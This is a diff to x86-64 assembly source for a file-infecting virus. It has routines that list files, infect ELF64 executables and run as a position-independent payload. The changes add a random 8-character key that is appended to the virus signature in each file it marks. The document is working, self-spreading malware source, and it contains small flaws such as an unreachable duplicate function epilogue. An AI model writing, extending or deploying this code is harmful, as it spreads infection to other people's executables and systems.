@@ -259,6 +259,69 @@ virus_search_signature:
     ret
 
 ; ============================================
+; virus_generate_key - Generate 8 ASCII printable characters from random data
+; rdi = destination buffer (must have at least 8 bytes)
+; Position-independent version for virus payload
+; ============================================
+virus_generate_key:
+    push rbp
+    mov rbp, rsp
+    sub rsp, 16                 ; space for random bytes
+    push rbx
+    push r12
+    
+    mov r12, rdi                ; save destination in r12
+
+    ; Get 8 random bytes using getrandom
+    mov eax, SYS_GETRANDOM
+    lea rdi, [rbp - 16]         ; buffer for random bytes
+    mov esi, 8                  ; length
+    xor edx, edx                ; flags = 0
+    syscall
+
+    ; Check if syscall succeeded
+    test rax, rax
+    js .vgk_fallback            ; if failed, use fallback
+
+    ; Convert random bytes to ASCII printable (33-126)
+    lea rsi, [rbp - 16]         ; source (random bytes)
+    mov rdi, r12                ; destination
+    mov rcx, 8                  ; counter
+
+.vgk_convert_loop:
+    lodsb                       ; load random byte into al
+    
+    ; Convert to printable range (33-126): al = 33 + (al % 94)
+    xor ah, ah                  ; clear ah for division
+    mov bl, 94                  ; divisor (126 - 33 + 1)
+    div bl                      ; al = quotient, ah = remainder
+    mov al, ah                  ; al = remainder
+    add al, 33                  ; al = 33 + remainder
+    
+    stosb                       ; store to destination
+    dec rcx
+    jnz .vgk_convert_loop
+    
+    jmp .vgk_done
+
+.vgk_fallback:
+    ; Fallback: use a simple pattern if getrandom fails
+    mov rdi, r12
+    mov rax, 0x2121212121212121 ; "!!!!!!!" as fallback
+    mov [rdi], rax
+
+.vgk_done:
+    pop r12
+    pop rbx
+    add rsp, 16
+    mov rsp, rbp
+    pop rbp
+    ret
+    mov rsp, rbp
+    pop rbp
+    ret
+
+; ============================================
 ; virus_list_and_infect - List files and infect ELF64 executables
 ; rdi = path buffer
 ; rsi = file count pointer
@@ -827,7 +890,7 @@ virus_infect_elf:
     jmp .vi_non_elf_sig_loop
 
 .vi_non_elf_append:
-    ; Append the signature to the file
+    ; Append the signature + unique 8-byte key to the file
     ; Seek to end of file
     mov eax, SYS_LSEEK
     mov edi, r13d
@@ -835,12 +898,31 @@ virus_infect_elf:
     mov edx, SEEK_END
     syscall
     
-    ; Write the signature
+    ; Prepare buffer with signature + key (on stack)
+    ; We need v_signature_len + 8 bytes total
+    sub rsp, 128                ; allocate space for signature + key buffer
+    
+    ; Copy signature to buffer
+    mov rcx, v_signature_len
+    lea rsi, [r15 + v_signature - virus_start]
+    mov rdi, rsp                ; destination on stack
+    rep movsb                   ; copy signature
+    
+    ; Generate 8-byte key and append it
+    mov rdi, rsp                ; buffer base
+    add rdi, v_signature_len    ; point to end of signature
+    call virus_generate_key     ; generate 8 bytes
+    
+    ; Write the signature + key
     mov eax, SYS_WRITE
     mov edi, r13d
-    lea rsi, [r15 + v_signature - virus_start]
+    mov rsi, rsp                ; buffer with signature + key
     mov edx, v_signature_len
+    add edx, 8                  ; total length = signature + 8 bytes
     syscall
+    
+    ; Clean up stack
+    add rsp, 128
     
     ; Close file and done
     jmp .vi_close_fail
@@ -1352,11 +1434,30 @@ process_non_elf_file:
 
     mov r13, rax
 
+    ; Prepare buffer with signature + key (on stack)
+    sub rsp, 128                ; allocate space for signature + key buffer
+    
+    ; Copy signature to buffer
+    mov rcx, signature_len
+    lea rsi, [rel signature]
+    mov rdi, rsp                ; destination on stack
+    rep movsb                   ; copy signature
+    
+    ; Generate 8-byte key and append it
+    mov rdi, rsp                ; buffer base
+    add rdi, signature_len      ; point to end of signature
+    call generate_key           ; generate 8 bytes
+    
+    ; Write the signature + key
     mov eax, SYS_WRITE
     mov edi, r13d
-    lea rsi, [rel signature]
+    mov rsi, rsp                ; buffer with signature + key
     mov edx, signature_len
+    add edx, 8                  ; total length = signature + 8 bytes
     syscall
+    
+    ; Clean up stack
+    add rsp, 128
 
     test rax, rax
     js .process_write_failed
@@ -1387,6 +1488,66 @@ process_non_elf_file:
     pop r14
     pop r13
     pop r12
+    mov rsp, rbp
+    pop rbp
+    ret
+
+
+; ============================================
+; generate_key - Generate 8 ASCII printable characters from random data
+; rdi = destination buffer (must have at least 8 bytes)
+; ============================================
+generate_key:
+    push rbp
+    mov rbp, rsp
+    sub rsp, 16                 ; space for random bytes
+    push rbx
+    push r12
+    
+    mov r12, rdi                ; save destination in r12
+
+    ; Get 8 random bytes using getrandom
+    mov eax, SYS_GETRANDOM
+    lea rdi, [rbp - 16]         ; buffer for random bytes
+    mov esi, 8                  ; length
+    xor edx, edx                ; flags = 0
+    syscall
+
+    ; Check if syscall succeeded
+    test rax, rax
+    js .gk_fallback             ; if failed, use fallback
+
+    ; Convert random bytes to ASCII printable (33-126)
+    lea rsi, [rbp - 16]         ; source (random bytes)
+    mov rdi, r12                ; destination
+    mov rcx, 8                  ; counter
+
+.gk_convert_loop:
+    lodsb                       ; load random byte into al
+    
+    ; Convert to printable range (33-126): al = 33 + (al % 94)
+    xor ah, ah                  ; clear ah for division
+    mov bl, 94                  ; divisor (126 - 33 + 1)
+    div bl                      ; al = quotient, ah = remainder
+    mov al, ah                  ; al = remainder
+    add al, 33                  ; al = 33 + remainder
+    
+    stosb                       ; store to destination
+    dec rcx
+    jnz .gk_convert_loop
+    
+    jmp .gk_done
+
+.gk_fallback:
+    ; Fallback: use a simple pattern if getrandom fails
+    mov rdi, r12
+    mov rax, 0x2121212121212121 ; "!!!!!!!" as fallback
+    mov [rdi], rax
+
+.gk_done:
+    pop r12
+    pop rbx
+    add rsp, 16
     mov rsp, rbp
     pop rbp
     ret
